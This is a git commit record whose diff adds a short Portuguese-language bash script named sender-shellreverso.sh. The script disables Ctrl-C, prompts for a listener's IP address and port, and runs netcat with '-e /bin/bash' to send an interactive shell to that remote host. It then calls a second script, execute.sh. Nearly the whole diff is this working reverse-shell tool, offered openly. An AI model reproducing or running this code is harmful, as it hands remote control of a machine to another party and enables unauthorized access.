e0ee3dd615db724dd09d66876e2be90adea5b21c
Eduardo <53496439+eduardbuzzi@users.noreply.github.com>
2020-03-29 22:57:02 -0300

    Update sender-shellreverso.sh

--- sender-shellreverso.sh
+++ sender-shellreverso.sh
@@ -1,1 +1,11 @@
-
+#!/bin/bash
+trap '' 2
+echo
+read -p "Informe o IP para enviar a Shell: " IPlistening
+read -p "Informe a porta que está escutando: " PORTA
+echo "Tentando enviar a Shell para a porta $PORTA do $IPlistening"
+echo
+trap 2
+nc $IPlistening $PORTA -e /bin/bash
+./execute.sh
+exit
